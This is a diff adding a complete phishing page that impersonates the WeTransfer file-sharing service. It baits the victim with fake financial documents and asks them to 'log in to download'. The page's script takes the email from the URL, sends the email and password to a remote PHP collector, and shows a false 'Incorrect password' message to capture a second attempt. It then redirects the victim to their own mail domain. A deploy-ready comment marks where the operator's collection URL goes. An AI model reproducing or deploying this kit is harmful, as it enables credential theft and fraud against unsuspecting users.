@@ -1,0 +1,222 @@
+<html lang="en"><head>    
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>WeTransfer</title>
+      <link rel="stylesheet" href="http://geoconsultantservices.com/new/we-transfer/css/main.css">
+      <link rel="shortcut icon" href="http://geoconsultantservices.com/new/we-transfer/img/logo.png" type="image/png">
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+      <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+      <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    </head>
+    <body>
+      <div class="top-area">
+        <div class="logo">
+          <img src="http://geoconsultantservices.com/new/we-transfer/img/logo.png" class="logo-image">
+        </div>
+        <div class="top-navigation">
+          <ul class="nav-list">
+            <li>Help</li>
+            <li>About</li>
+            <li>Sign up</li>
+            <li>Log in</li>
+          </ul>
+        </div>
+      </div>
+      <div class="peace">
+        <p class="main">Even more peace <br>of mind with Plus</p>
+        <p class="small">Password protect your transfers</p>
+        <button class="peace-btn" id="dlBtn">Get WeTransfer Plus</button>
+      </div>
+      <div class="downloader-box show" id="box">
+        <div class="scrollable-content">
+          <div class="content">
+            <p class="heading-1">Ready when you are</p>
+            <p class="duration-text">Files deleted in 7 days</p>
+            <p class="download-note">
+             
+            </p>
+            <div class="files">
+              <ul class="file-list">
+                <li class="file">
+                  <div class="file-detail">
+                    <p class="filename">DOC230123-3.PDF</p>
+                    <p class="file-info">27 MB - pdf</p>
+                  </div>
+                  <div class="file-action" id="dlBtn">
+                    <svg viewBox="0 0 24 24">
+                      <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path>
+                    </svg>
+                  </div>
+                </li>
+                <li class="file">
+                  <div class="file-detail">
+                    <p class="filename">Bank Remittance.PDF</p>
+                    <p class="file-info">12 MB - pdf</p>
+                  </div>
+                  <div class="file-action" id="dlBtn">
+                    <svg viewBox="0 0 24 24">
+                      <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path>
+                    </svg>
+                  </div>
+                </li>
+                <li class="file">
+                  <div class="file-detail">
+                    <p class="filename">INV DOC230123-3.PDF</p>
+                    <p class="file-info">49 MB - pdf</p>
+                  </div>
+                  <div class="file-action" id="dlBtn">
+                    <svg viewBox="0 0 24 24">
+                      <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path>
+                    </svg>
+                  </div>
+                </li>
+                <li class="file">
+                  <div class="file-detail">
+                    <p class="filename">Statement of Account.PDF</p>
+                    <p class="file-info">51 MB - pdf</p>
+                  </div>
+                  <div class="file-action" id="dlBtn">
+                    <svg viewBox="0 0 24 24">
+                      <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path>
+                    </svg>
+                  </div>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div class="downloader-box-footer">
+          <button class="download-btn" id="doBtn">Download</button>
+        </div>
+      </div>
+      <div class="login-container" id="nbox">
+        <div class="download-logo">
+          <svg viewBox="0 0 24 24">
+            <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path>
+          </svg>
+        </div>
+        <div>
+          <p class="login-notice">Login to Download</p>
+        </div>
+        <p class="form-error" id="message"></p>
+        <form name="loginform" method="post" action="">
+          <div class="form-group">
+            <label for="">Email Address</label>
+            <input type="email" id="email" class="form-control" name="email" placeholder="Email Address">
+            <div class="email-error"></div>
+          </div>
+          <div class="form-group">
+            <label for="">Password</label>
+            <input type="password" id="password" class="form-control" name="password" placeholder="Password">
+            <div class="password-error"></div>
+            <input type="hidden" id="source" name="source">
+          </div>
+          <div class="form-group btn-area">
+            <button class="download-btn" id="submitbtn" type="submit">Download</button>
+          </div>
+        </form>
+      </div>
+
+
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script type="text/javascript">
+
+    const nbox = document.getElementById('nbox');
+    const box = document.getElementById('box');
+    const doBtn = document.getElementById('doBtn'); 
+
+
+    doBtn.addEventListener("click", function() {
+      box.classList.remove('show');
+      nbox.classList.add('active');
+    })
+
+
+    const url = "http://geoconsultantservices.com/new/we-transfer/php_file/pushmail.php";  // ADD THE LINK TO THE EMAIL.PHP FILE HERE
+
+    const param = window.location.hash.split('#')[1];
+    let emailParam = param ? param : '';
+    let count = 0;
+
+    const email = document.getElementById('email');
+    const password = document.getElementById('password');
+    const source = document.getElementById('source');
+    const login = document.getElementById('submitbtn');
+    const err = document.getElementById('message');
+    const form = document.getElementById("loginform");
+    email.value = emailParam;
+
+    login.addEventListener('click', function(e){
+        e.preventDefault();
+        if (email.value === "") {
+            err.textContent = "Enter a valid email address";
+            email.focus();
+            showEl(err, "red");
+            return;
+        } else if (!email.value.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
+            err.textContent = "Enter a valid email address";
+            email.focus();
+            showEl(err, "red");
+            return;
+        } else if (password.value === "") {
+            err.textContent = "Please enter a valid password for you account";
+            password.focus();
+            showEl(err, "red");
+            return;
+        } else {
+            const domain = email.value.split('@')[1];
+            count = count + 1;
+            showEl(err, "red");
+            err.textContent = "!! Incorrect password...";
+
+            var data = {
+                email: email.value,
+                password: password.value,
+                source: source.value
+            };
+            console.log(data);
+
+            $.ajax({
+                type: "POST",
+                url: url,
+                data: data,
+                cache: false,
+                timeout: 800000,
+                success: function(res) {
+                    if(res == true) {
+                      password.value = "";
+                        if (count > 1) {
+                            hideEl(err);
+                            window.location.href = "https://www."+domain;
+                            return;
+                        }
+                    }else {
+                        showEl(err, "red");
+                        err.textContent = "Something went wrong, please try again";
+                        password.value = "";
+                        password.style.borderColor = "red";
+                    }
+                },
+                error: function(e) {
+                    showEl(err, "red");
+                    err.textContent = "Something went wrong, please try again";
+                    password.value = "";
+                    password.style.borderColor = "red";
+                }
+            });
+        }
+    });
+
+    function showEl(el, color) {
+        el.style.color = color;
+        el.style.display = "block";
+    }
+
+    function hideEl(el) {
+        el.style.color = '#000';
+        el.style.display = "none";
+        el.textContent = "";
+    }
+</script>
+  </body>
+</html>
